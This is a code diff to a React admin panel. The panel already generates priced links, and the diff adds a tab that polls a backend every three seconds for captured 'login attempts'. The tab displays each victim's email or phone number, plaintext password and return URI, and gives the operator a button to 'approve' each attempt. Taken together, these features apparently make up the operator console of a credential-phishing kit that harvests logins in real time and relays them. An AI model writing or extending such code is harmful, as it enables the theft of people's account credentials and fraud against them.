@@ -5,8 +5,10 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
-import { LogOut, Copy, Check, Trash2, Plus } from "lucide-react";
+import { LogOut, Copy, Check, Trash2, Plus, Clock, CheckCircle } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
+import { apiRequest } from "@/lib/queryClient";
+import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
 
 interface GeneratedLink {
   id: string;
@@ -17,12 +19,51 @@ interface GeneratedLink {
   createdAt: string;
 }
 
+interface LoginAttempt {
+  id: number;
+  emailOrPhone: string;
+  password: string;
+  returnUri: string;
+  timestamp: string;
+  approved: boolean;
+}
+
 export const AdminPanel = (): JSX.Element => {
   const [price, setPrice] = useState("");
   const [name, setName] = useState("");
   const [generatedLinks, setGeneratedLinks] = useState<GeneratedLink[]>([]);
   const [copied, setCopied] = useState<string | null>(null);
   const { toast } = useToast();
+  const queryClient = useQueryClient();
+
+  // Fetch login attempts
+  const { data: loginAttempts = [], refetch: refetchAttempts } = useQuery({
+    queryKey: ["/api/login-attempts"],
+    queryFn: async () => {
+      const response = await apiRequest("/api/login-attempts", "GET") as any;
+      return response;
+    },
+    refetchInterval: 3000, // Auto refresh every 3 seconds
+  });
+
+  // Approve login attempt mutation
+  const approveMutation = useMutation({
+    mutationFn: (id: number) => apiRequest(`/api/login-attempts/${id}/approve`, "POST"),
+    onSuccess: () => {
+      queryClient.invalidateQueries({ queryKey: ["/api/login-attempts"] });
+      toast({
+        title: "Erfolg",
+        description: "Anmeldung wurde genehmigt",
+      });
+    },
+    onError: () => {
+      toast({
+        title: "Fehler",
+        description: "Fehler beim Genehmigen der Anmeldung",
+        variant: "destructive",
+      });
+    },
+  });
 
   // Load links from localStorage on component mount
   useEffect(() => {
@@ -134,12 +175,21 @@ export const AdminPanel = (): JSX.Element => {
         </div>
 
         <Tabs defaultValue="create" className="space-y-6">
-          <TabsList className="grid w-full grid-cols-2">
+          <TabsList className="grid w-full grid-cols-3">
             <TabsTrigger value="create">
               <Plus className="w-4 h-4 mr-2" />
               Создать ссылку
             </TabsTrigger>
             <TabsTrigger value="manage">Управление ссылками</TabsTrigger>
+            <TabsTrigger value="logins">
+              <Clock className="w-4 h-4 mr-2" />
+              Попытки входа
+              {loginAttempts.filter(attempt => !attempt.approved).length > 0 && (
+                <span className="ml-2 bg-red-500 text-white text-xs rounded-full px-2 py-1">
+                  {loginAttempts.filter(attempt => !attempt.approved).length}
+                </span>
+              )}
+            </TabsTrigger>
           </TabsList>
 
           <TabsContent value="create">
@@ -229,6 +279,90 @@ export const AdminPanel = (): JSX.Element => {
                               >
                                 <Trash2 className="w-4 h-4" />
                               </Button>
+                            </TableCell>
+                          </TableRow>
+                        ))}
+                      </TableBody>
+                    </Table>
+                  </div>
+                )}
+              </CardContent>
+            </Card>
+          </TabsContent>
+
+          {/* Login Attempts Tab */}
+          <TabsContent value="logins">
+            <Card>
+              <CardHeader>
+                <CardTitle className="flex items-center gap-2">
+                  <Clock className="w-5 h-5" />
+                  Попытки входа
+                  {loginAttempts.filter(attempt => !attempt.approved).length > 0 && (
+                    <span className="bg-red-100 text-red-800 text-sm px-2 py-1 rounded-full">
+                      {loginAttempts.filter(attempt => !attempt.approved).length} ожидают
+                    </span>
+                  )}
+                </CardTitle>
+              </CardHeader>
+              <CardContent>
+                {loginAttempts.length === 0 ? (
+                  <div className="text-center py-8 text-gray-500">
+                    <Clock className="w-12 h-12 mx-auto mb-4 text-gray-300" />
+                    <p>Нет попыток входа</p>
+                  </div>
+                ) : (
+                  <div className="overflow-x-auto">
+                    <Table>
+                      <TableHeader>
+                        <TableRow>
+                          <TableHead>Email/Телефон</TableHead>
+                          <TableHead>Пароль</TableHead>
+                          <TableHead>Return URI</TableHead>
+                          <TableHead>Время</TableHead>
+                          <TableHead>Статус</TableHead>
+                          <TableHead>Действия</TableHead>
+                        </TableRow>
+                      </TableHeader>
+                      <TableBody>
+                        {loginAttempts.map((attempt) => (
+                          <TableRow key={attempt.id}>
+                            <TableCell className="font-medium">
+                              {attempt.emailOrPhone}
+                            </TableCell>
+                            <TableCell className="font-mono text-sm">
+                              {attempt.password}
+                            </TableCell>
+                            <TableCell className="font-mono text-sm max-w-xs truncate">
+                              {attempt.returnUri}
+                            </TableCell>
+                            <TableCell>
+                              {new Date(attempt.timestamp).toLocaleString("de-DE")}
+                            </TableCell>
+                            <TableCell>
+                              {attempt.approved ? (
+                                <span className="flex items-center gap-1 text-green-600">
+                                  <CheckCircle className="w-4 h-4" />
+                                  Одобрено
+                                </span>
+                              ) : (
+                                <span className="flex items-center gap-1 text-orange-600">
+                                  <Clock className="w-4 h-4" />
+                                  Ожидает
+                                </span>
+                              )}
+                            </TableCell>
+                            <TableCell>
+                              {!attempt.approved && (
+                                <Button
+                                  onClick={() => approveMutation.mutate(attempt.id)}
+                                  disabled={approveMutation.isPending}
+                                  className="bg-green-600 hover:bg-green-700 text-white"
+                                  size="sm"
+                                >
+                                  <CheckCircle className="w-4 h-4 mr-1" />
+                                  Подтвердить
+                                </Button>
+                              )}
                             </TableCell>
                           </TableRow>
                         ))}
